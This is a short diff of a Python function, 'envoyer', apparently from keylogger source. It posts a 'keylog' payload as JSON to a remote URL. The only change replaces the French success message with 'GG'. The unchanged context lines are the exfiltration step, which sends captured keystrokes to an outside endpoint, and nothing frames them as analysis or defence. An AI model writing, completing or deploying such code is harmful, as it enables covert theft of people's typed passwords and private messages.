@@ -19,7 +19,7 @@ def envoyer():
     try:
         response = requests.post(url, json=keylog)
         if response.status_code == 204:
-            print("Données envoyées avec succès !")
+            print("GG")
         else:
             print(f"Erreur : {response.status_code}")
     except Exception as e:
